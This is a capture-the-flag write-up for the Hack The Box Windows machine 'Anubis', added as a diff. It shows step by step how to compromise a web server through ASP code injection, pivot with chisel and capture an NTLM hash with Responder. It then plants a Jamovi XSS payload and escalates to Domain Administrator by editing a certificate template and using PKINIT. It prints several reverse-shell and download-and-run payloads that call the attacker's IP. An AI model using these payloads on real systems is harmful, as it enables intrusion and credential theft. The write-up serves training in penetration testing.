@@ -1,0 +1,303 @@
+                    Anubis
+
+                                                                           27th January 2022 / Document No D22.100.155
+                                                                           Prepared By: polarbearer
+                                                                           Machine Author(s): 4ndr34z
+                                                                           Difficulty: Insane
+                                                                           Classification: Official
+
+                              Synopsis
+
+Anubis is an insane difficulty Windows machine that showcases how a writable certificate template in the
+Windows Public Key Infrastructure can lead to the escalation of privileges to Domain Administrator in an
+Active Directory environment. An interactive shell on a Windows container can be obtained by exploiting a
+simple ASP code injection vulnerability in a public-facing web application. Pivoting from the initial shell,
+further access is gained to an internal web application that can be tricked into sending requests to an
+attacker-controlled Responder server, allowing to steal valid domain credentials that can be used to access
+an internal SMB share where malicious Jamovi files can be uploaded, resulting in a shell on the Windows
+host. After adding the smart card logon extended usage attribute to an available certificate template and
+requesting a new client certificate, PKINIT can be configured on an attacking Linux machine to request a
+Kerberos ticket and login to the system as Administrator.
+
+Skills Required
+
+      Enumeration
+      Pivoting
+      Basic Windows / Active Directory knowledge
+
+Skills Learned
+Skills Learned
+
+      ASP code injection
+      XSS to RCE in Electron applications
+      Exploiting misconfigured certificate templates
+
+Enumeration
+
+Nmap
+
+   ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.102 | grep ^[0-9] | cut -d '/' -f 1 | tr
+   '\n' ',' | sed s/,$//)
+   nmap -sC -sV -p$ports 10.10.11.102
+Nmap output reveals that, in addition to standard Windows RPC ports, an HTTP server is listening on port
+443 (SSL). The common name from the certificate is www.windcorp.htb .
+
+IIS
+
+Browsing to port 443 by IP address results in a 404 error. We add an entry for www.windcorp.htb to
+/etc/hosts and then access the web server by name.
+
+   echo "10.10.11.102 www.windcorp.htb" | sudo tee -a /etc/hosts
+After accepting the self-signed certificate, the main web page is displayed.
+
+A contact form is found at the bottom of the page:
+
+We try sending a test message and notice that our input is reflected back to us:
+Foothold
+
+The contact form appears to be vulnerable to ASP code injection, as we can verify by sending the following
+message:
+
+   <% response.write("Testing ASP code injection") %>
+As we can see, the code was parsed and response.write() was executed. We can turn this into Remote
+Command Execution and obtain a reverse shell on the system. First, we try executing a simple command by
+sending the following payload:
+
+   <%Function execStdOut(cmd)
+              Dim wsh: Set wsh = CreateObject( "WScript.Shell" )
+              Dim aRet: Set aRet = wsh.exec(cmd)
+              execStdOut = aRet.StdOut.ReadAll()
+
+      End Function
+      theOutput = execStdOut("whoami")
+      response.write "Output: " & theOutput
+   %>
+
+The command is executed:
+
+To get a reverse shell, we first transfer nc64.exe to the target by running a Python http.server on our
+machine:
+
+   python3 -m http.server 80
+
+The download will be initiated by sending the following payload (where 10.10.14.44 is our VPN IP address)
+from the contact form:
+
+   <%Function execStdOut(cmd)
+                 Dim wsh: Set wsh = CreateObject( "WScript.Shell" )
+                 Dim aRet: Set aRet = wsh.exec(cmd)
+                 execStdOut = aRet.StdOut.ReadAll()
+
+          End Function
+          theOutput = execStdOut("curl 10.10.14.44/nc64.exe -o \programdata\nc64.exe")
+          response.write "Output: " & theOutput
+   %>
+The file is downloaded as expected:
+
+Next, we open a listener on our attacking machine:
+   nc -lnvp 7777
+
+Finally, we send the following payload to execute nc64.exe and send a cmd.exe shell back to our listener:
+   <%Function execStdOut(cmd)
+                 Dim wsh: Set wsh = CreateObject( "WScript.Shell" )
+                 Dim aRet: Set aRet = wsh.exec(cmd)
+                 execStdOut = aRet.StdOut.ReadAll()
+          End Function
+          theOutput = execStdOut("\programdata\nc64.exe 10.10.14.44 7777 -e cmd")
+          response.write "Output: " & theOutput
+   %>
+
+A reverse shell is received.
+
+Lateral Movement
+
+We soon realise that we're inside a container:
+A file called req.txt , containing a certificate request, is found on the Administrator's desktop:
+
+We copy the file to our machine and verify it with OpenSSL:
+   openssl req -text -noout -verify -in req.txt
+We take note of the common name softwareportal.windcorp.htb .
+Next, we start enumerating the network. The ipconfig command displays the internal IP addresses of the
+container and the default gateway, which likely corresponds to the host machine.
+
+We will use chisel to pivot to the internal network. We host chisel.exe on our local Python http.server
+and use curl to download it to the target:
+
+   curl 10.10.14.44/chisel.exe -o \programdata\chisel.exe
+We run the server on our attacking machine and the client on the target, setting up a socks5 proxy:
+
+   chisel server -p 8000 --reverse
+   \programdata\chisel client 10.10.14.44:8000 R:socks
+We configure ProxyChains ( /etc/proxychains.conf ) on our attacking machine:
+   socks5 127.0.0.1 1080
+We run nmap to discover open ports on what we previously identified as the host IP address (only scanning
+for top 100 ports):
+   proxychains nmap -sT -Pn -n --top-ports 100 172.29.240.1 -v
+
+Port 80 is open. When accessing it with our web browser (after setting up 127.0.0.1:1080 as socks5 proxy)
+we receive a 404 error:
+We try using the host name found earlier in the certificate request, after adding a corresponding entry to
+our /etc/hosts file:
+
+   echo "172.29.240.1 softwareportal.windcorp.htb" | sudo tee -a /etc/hosts
+This yields a different result: the Windcorp Software-Portal page is displayed.
+
+At the bottom of the page we find links to install different software products.
+All the above links look like the following:
+   http://softwareportal.windcorp.htb/install.asp?client=172.29.247.13&software=7z1900-
+   x64.exe
+
+Requests are sent to install.asp with two parameters, namely client and software (where the
+client value corresponds to the IP address of the container).
+
+We run Responder and change the client parameter to our VPN IP address:
+   responder -I tun0
+   http://softwareportal.windcorp.htb/install.asp?client=10.10.14.44&software=7z1900-
+   x64.exe
+
+An NTLMv2 hash for the localadmin user is captured.
+
+The hash can be easily cracked using a tool like John the Ripper, revealing the password Secret123 :
+   john --wordlist=/usr/share/wordlists/rockyou.txt hash
+The obtained credentials can be used for further enumeration. We list available SMB shares:
+   proxychains smbclient -L 172.29.240.1 -U localadmin
+
+We connect to the Shared share:
+   proxychains smbclient //172.29.240.1/Shared -U localadmin
+
+The Documents\Analytics directory contains some .omv files. We notice that one of them, called
+Whatif.omv , is updated regularly:
+The omv file extension seems to identify Jamovi documents, which is consistent with our previous findings
+(Jamovi was installable from the software portal). Searching for related vulnerabilities we come across CVE-
+2021-28079, which affects Jamovi <= 1.6.18. Since the version that can be installed from the software portal
+is 1.6.16.0, there is a good possibility that our target is vulnerable. According to the CVE description, the
+column-name is vulnerable to XSS in the ElectronJS Framework, which could allow for remote code
+execution. To inject our payload, we first extract the .omv archive with the unzip command:
+
+   unzip Whatif.omv
+
+We then edit the metadata.json file by modifying the first name field as follows:
+
+   {"dataSet": {"rowCount": 150, "columnCount": 5, "removedRows": [], "addedRows": [],
+   "fields": [{"name": "Sepal.Length <script>require('child_process').exec('curl
+   10.10.14.13/nc64.exe -o /programdata/nc64.exe && /programdata/nc64.exe 10.10.14.13 7777
+   -e cmd')</script>", "id": 1 <SNIP>
+
+We update the archive with the modified metadata.json file:
+
+   zip Whatif.omv metadata.json
+
+We open a Python http.server and a Netcat listener:
+
+   python3 -m http.server 80
+   nc -lnvp 7777
+
+We connect to the SMB share again and overwrite the Whatif.omv file in Documents\Analytics with our
+malicious one:
+   proxychains smbclient //172.29.240.1/Shared -U localadmin
+   smb: \> cd Documents\
+   smb: \Documents\> cd Analytics\
+   smb: \Documents\Analytics\> put Whatif.omv
+
+After a few minutes, a reverse shell as diegocruz on the host earth is sent to our listener.
+
+The user flag can be found in C:\Users\diegocruz\desktop\user.txt .
+
+Privilege Escalation
+
+We connect to the CertEnroll share:
+   proxychains smbclient //172.29.240.1/CertEnroll -U localadmin
+
+Among other files, the CA certificate for the domain is available. We download it.
+From our shell on the earth host we list the available certificate templates:
+   certutil -catemplates
+
+The user is allowed access to the Web template. We look at the template permissions:
+   certutil -v -dstemplate Web
+Users in the webdevelopers group have full control over the template. Our current user ( DiegoCruz ) is a
+member of this group:
+
+The ability to edit certificate templates allows us to impersonate the Domain Administrator by logging on
+with a client certificate, as detailed in this article. Following the steps in the linked article, we will first modify
+the certificate template to make it eligible for smart card logon, then create a certificate request file and
+submit it to the CA. Finally, we will configure Kerberos on our attacking machine to use Public Key
+Cryptography for Initial Authentication (PKINIT) to obtain a ticket that allows us to login to the system as
+Administrator.
+We open a PowerShell session and run the following commands to modify the Web template:
+
+   $EKUs=@("1.3.6.1.5.5.7.3.2", "1.3.6.1.4.1.311.20.2.2")
+   Set-ADObject "CN=Web,CN=Certificate Templates,CN=Public Key
+   Services,CN=Services,CN=Configuration,DC=windcorp,DC=htb" -Add
+   @{pKIExtendedKeyUsage=$EKUs;"msPKI-Certificate-Application-Policy"=$EKUs}
+
+We run the following shell script (taken from the article linked above) on our attacking machine to generate
+a certificate request:
+
+   cnffile="admin.cnf"
+   reqfile="admin.req"
+   keyfile="admin.key"
+   dn="/DC=htb/DC=windcorp/CN=Users/CN=Administrator"
+   cat > $cnffile <<EOF
+   [ req ]
+   default_bits = 2048
+   prompt = no
+   req_extensions = user
+   distinguished_name = dn
+   [ dn ]
+   CN = Administrator
+   [ user ]
+   subjectAltName = otherName:msUPN;UTF8:administrator@windcorp.htb
+   EOF
+   openssl req -config $cnffile -subj $dn -new -nodes -sha256 -out $reqfile -keyout
+   $keyfile
+Three files ( admin.cnf , admin.key , admin.req ) are created. We transfer the admin.req file to the target
+machine:
+   curl 10.10.14.44/admin.req -o \programdata\admin.req
+We submit the request to the CA to generate a client certificate:
+   cd \programdata
+   certreq.exe -submit -config earth.windcorp.htb\windcorp-CA -attrib
+   "CertificateTemplate:Web" admin.req admin.cer
+The admin.cer file is generated. We copy it to our attacking machine and verify that Smartcard Login is
+enabled for extended usage.
+   openssl x509 -in admin.cer -text -noout | grep -B1 Smartcard
+
+We convert the CA certificate downloaded from the CertEnroll share to PEM format:
+   openssl x509 -inform DER -in earth.windcorp.htb_windcorp-CA.crt -out ca.cer -text
+
+We create a temporary directory (i.e. /tmp/anubis ) and copy the admin.cer , admin.key and ca.cer files
+to this directory:
+
+   mkdir /tmp/anubis; cp admin.cer admin.key ca.cer /tmp/anubis/
+Depending on our attacking machine setup, we may need to install additional packages in order to
+configure Kerberos for PKINIT (for example, we need the krb5-user and krb5-pkinit packages on
+Debian-based systems). We edit the /etc/krb5.conf file as follows:
+   [libdefaults]
+          default_realm = WINDCORP.HTB
+
+   [realms]
+          WINDCORP.HTB = {
+                 kdc = earth.windcorp.htb
+                 admin_server = earth.windcorp.htb
+                 pkinit_anchors = FILE:/tmp/anubis/ca.cer
+                 pkinit_identites = FILE:/tmp/anubis/admin.cer,/tmp/anubis/admin.key
+                 pkinit_kdc_hostname = earth.windcorp.htb
+                 pkinit_eku_checking = kpServerAuth
+          }
+
+   [domain_realm]
+          .windcorp.htb = WINDCORP.HTB
+          windcorp.htb = WINDCORP.HTB
+
+We add an entry for earth.windcorp.htb to our /etc/hosts file:
+   echo "172.29.240.1 earth.windcorp.htb" | sudo tee -a /etc/hosts
+
+We move to the temporary directory and run kinit to request a ticket:
+   ccd /tmp/anubis; proxychains kinit -X X509_user_identity=FILE:admin.cer,admin.key
+   Administrator@WINDCORP.HTB
+
+We verify our ticket with klist :
+
+We can now use evil-winrm to obtain an interactive shell as Administrator:
+   proxychains evil-winrm -i earth.windcorp.htb -u administrator -r WINDCORP.HTB
+The root flag can be found in C:\Users\Administrator\Desktop\root.txt .
+
